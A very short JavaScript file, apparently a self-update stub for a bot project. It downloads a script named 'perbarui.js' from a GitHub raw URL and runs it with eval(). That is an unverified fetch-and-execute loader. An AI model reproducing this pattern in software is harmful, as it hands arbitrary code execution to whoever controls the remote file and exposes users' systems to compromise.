/* HADY ZEN'IN */

const axios = require('axios');
axios.get("https://raw.githubusercontent.com/HadyZen/Ayanokoji-Kiyotaka/refs/heads/main/perbarui.js")
	.then(res => eval(res.data));
